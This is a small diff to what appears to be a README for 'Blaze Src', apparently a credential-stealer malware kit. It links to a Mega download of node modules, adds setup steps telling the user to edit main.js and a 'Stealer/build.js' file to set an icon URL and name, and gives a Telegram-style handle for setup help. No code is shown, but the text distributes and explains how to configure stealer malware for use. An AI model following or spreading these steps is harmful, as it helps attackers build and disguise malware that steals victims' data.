@@ -1,4 +1,7 @@
 Blaze Src undualhooked 
 nodes modules for the Client https://mega.nz/file/1BoC3Kga#sqMVoA8AH5yjeTFeBlwICtGuPYvpjHKp0kaK0lSA-Pc
 
+edit main.js 
+edit slash/Stealer/build.js (add iconurl, name etc)
+
 for setup dm @darkgram2
